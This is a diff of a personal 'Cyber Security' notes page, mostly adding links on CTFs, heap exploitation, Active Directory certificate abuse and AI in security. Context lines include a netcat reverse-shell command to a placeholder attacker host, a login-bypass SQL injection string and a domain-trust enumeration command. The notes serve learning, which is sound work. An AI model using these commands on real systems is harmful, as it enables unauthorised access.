@@ -2,7 +2,7 @@
 title: Cyber Security
 description: ""
 created: 2022-12-31
-updated: 2025-07-06
+updated: 2025-10-05
 tags:
   - security
 ---
@@ -200,6 +200,8 @@ The focus of the last 3 stages is _DETECTION and RESPONSE_.
 
 [After My Data Was Breached, Here's How I Protected My Accounts](https://www.makeuseof.com/how-protect-accounts-after-data-breach/)
 
+[How To Automate Alert Triage With AI Agents and Confluence SOPs Using Tines](https://thehackernews.com/2025/09/how-to-automate-alert-triage-with-ai.html)
+
 ## Learning/Courses/Videos
 
 [Free Courses That Are Actually Free: Cybersecurity Edition - KDnuggets](https://www.kdnuggets.com/free-courses-that-are-actually-free-cybersecurity-edition)
@@ -381,6 +383,8 @@ https://www.comptia.org/certifications/security
 
 [Pay What You Can – Antisyphon Training](https://www.antisyphontraining.com/pay-what-you-can/) pay what you can, free tier available
 
+[stacksmash.io\_](https://stacksmash.io/)
+
 [Pentester Academy's AttackDefense Lab](https://www.pentesteracademy.com/onlinelabs)
 [PentesterAcademy Labs - YouTube](https://www.youtube.com/playlist?list=PLzKIBgD3ky23LVO6MVy54mQo3IuzdkNq5)
 [Pentester Academy Blog](https://blog.pentesteracademy.com/)
@@ -392,6 +396,7 @@ https://www.comptia.org/certifications/security
 [ClassLabs/navigation.md at main · strandjs/ClassLabs](https://github.com/strandjs/ClassLabs/blob/main/navigation.md)
 
 [Ne0Lux-C1Ph3r/WRITE-UP: Write up CTF](https://github.com/Ne0Lux-C1Ph3r/WRITE-UP)
+[ble55ing/ctfpwn: some writeup of pwnabletw](https://github.com/ble55ing/ctfpwn)
 
 [Introduction · CTF Field Guide](https://trailofbits.github.io/ctf/) [source](https://github.com/trailofbits/ctf)
 [trailofbits/ctf-challenges: CTF Challenges](https://github.com/trailofbits/ctf-challenges)
@@ -945,6 +950,16 @@ Godpotato
 
 [quasar/Quasar: Remote Administration Tool for Windows](https://github.com/quasar/Quasar)
 
+## Heap Exploit
+
+[shellphish/how2heap: A repository for learning various heap exploitation techniques.](https://github.com/shellphish/how2heap)
+
+[Heap Exploitation Part 1: Understanding the Glibc Heap Implementation | Azeria Labs](https://azeria-labs.com/heap-exploitation-part-1-understanding-the-glibc-heap-implementation/)
+[Heap Exploitation Part 2: Understanding the Glibc Heap Implementation | Azeria Labs](https://azeria-labs.com/heap-exploitation-part-2-glibc-heap-free-bins/)
+[Heap Exploit Development | Azeria Labs](https://azeria-labs.com/heap-exploit-development-part-1/)
+[Heap Overflows and the iOS Kernel Heap | Azeria Labs](https://azeria-labs.com/heap-overflows-and-the-ios-kernel-heap/)
+[Grooming the iOS Kernel Heap | Azeria Labs](https://azeria-labs.com/grooming-the-ios-kernel-heap/)
+
 ## Password Hacking
 
 [[web-authentication#Active Directory]]
@@ -1262,8 +1277,12 @@ Low Level Learning
 
 [Countdown to GovWare 2023 - The Application of Artificial Intelligence (AI) in Cybersecurity - NSFOCUS, Inc., a global network and cyber security leader, protects enterprises and carriers from advanced cyber attacks.](https://nsfocusglobal.com/countdown-to-govware-2023-the-application-of-artificial-intelligence-ai-in-cybersecurity/#Attack_Preparation)
 [Agentic AI Paves the Way for Sophisticated Cyberattacks](https://aibusiness.com/generative-ai/agentic-ai-paves-the-way-for-sophisticated-cyberattacks)
+[Get Ready, the AI Hacks Are Coming](https://gizmodo.com/get-ready-the-ai-hacks-are-coming-2000639625)
 
 [CyberNative/CyberBase-13b · Hugging Face](https://huggingface.co/CyberNative/CyberBase-13b)
+
+[trailofbits/buttercup](https://github.com/trailofbits/buttercup) AI-driven system for discovering and patching vulnerabilities
+[Buttercup is now open-source! -The Trail of Bits Blog](https://blog.trailofbits.com/2025/08/08/buttercup-is-now-open-source/)
 
 ### Jailbreak
 
@@ -1489,7 +1508,7 @@ nc ATTACKER 5555 -e sh
 
 Simple injection on username field: `ANYNAME OR' 1=1 --`
 
-[SQL injection - Wikiwand](http://www.wikiwand.com/en/SQL_injection)
+[SQL injection - Wikiwand](https://www.wikiwand.com/en/SQL_injection)
 [SQL injection techniques - Getting started with SQL injection - YouTube](https://www.youtube.com/watch?v=05SmIqGX4zQ)
 [Step-by-step SQL injection guide to bypassing basic login screen - Mastering SQL injection - YouTube](https://www.youtube.com/watch?v=SJgYdTckMBY)
 [What is SQL Injection? Tutorial & Examples | Web Security Academy](https://portswigger.net/web-security/sql-injection)
@@ -1519,7 +1538,9 @@ Simple injection on username field: `ANYNAME OR' 1=1 --`
 [NoSQL injection - HackTricks](https://book.hacktricks.xyz/pentesting-web/nosql-injection)
 
 [WSTG - Latest | OWASP Foundation](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.6-Testing_for_NoSQL_Injection)
-[SQL Injection in MongoDB: Examples and Prevention](https://brightsec.com/blog/sql-injection-in-mongodb-examples-and-prevention/)
+[SQL Injection in MongoDB: Examples and Prevention](https://brightsec.com/blog/sql-injection-in-mongodb-examples-and-prevention/) 2025-03
+[Defending Against Query Selector Injection Attacks | www.thecodebarbarian.com](https://thecodebarbarian.com/2014/09/04/defending-against-query-selector-injection-attacks.html) 2014-09
+[Hacking NodeJS and MongoDB | Websecurify Blog](https://blog.websecurify.com/2014/08/hacking-nodejs-and-mongodb) 2014-08
 
 [node.js - Mitigating MongoDB injection attacks with Mongoose - Stack Overflow](https://stackoverflow.com/questions/52707399/mitigating-mongodb-injection-attacks-with-mongoose)
 [How does MongoDB avoid the SQL injection mess? - Stack Overflow](https://stackoverflow.com/questions/5021456/how-does-mongodb-avoid-the-sql-injection-mess)
@@ -1570,6 +1591,13 @@ nltest /server:ASPDC02 /domain_trusts
 [Disable NTLM authentication on Windows Server 2025 – 4sysops](https://4sysops.com/archives/disable-ntlm-authentication-on-windows-server-2025/)
 
 [Generate an NTLM Hash - NTLM Password - Online - Browserling Web Developer Tools](https://www.browserling.com/tools/ntlm-hash)
+
+## Active Directory
+
+[Masky release (v0.0.3) | Zak's blog](https://z4ksec.github.io/posts/masky-release-v0.0.3/)
+[Z4kSec/Masky: Python library with CLI allowing to remotely dump domain user credentials via an ADCS without dumping the LSASS process memory](https://github.com/Z4kSec/Masky)
+[GhostPack/Certify: Active Directory certificate abuse.](https://github.com/GhostPack/Certify)
+[ly4k/Certipy: Tool for Active Directory Certificate Services enumeration and abuse](https://github.com/ly4k/Certipy)
 
 ## PHP
 
@@ -1641,11 +1669,11 @@ Use time difference in array comparison to brute force the digest byte by byte.
 ## BREACH
 
 [BREACH ATTACK](http://breachattack.com/)
-[BREACH (security exploit) - Wikiwand](<http://www.wikiwand.com/en/BREACH_(security_exploit)>)
+[BREACH (security exploit) - Wikiwand](<https://www.wikiwand.com/en/BREACH_(security_exploit)>)
 
 ## Stuxnet
 
-[Stuxnet - Wikiwand](http://www.wikiwand.com/en/Stuxnet)
+[Stuxnet - Wikiwand](https://www.wikiwand.com/en/Stuxnet)
 [Stuxnet explained: The first known cyberweapon | CSO Online](https://www.csoonline.com/article/562691/stuxnet-explained-the-first-known-cyberweapon.html)
 [Stuxnet: a 3-Parts Series | Curious Minds - Curious Minds Podcast](http://www.cmpod.net/stuxnet-the-malware-that-struck-the-iranian-nuclear-program-pt-1/)
 [Stuxnet: Advanced Persistent Threat - Ran Levi](http://www.cmpod.net/all-transcripts/stuxnet-the-malware-that-struck-the-iranian-nuclear-program-text/)
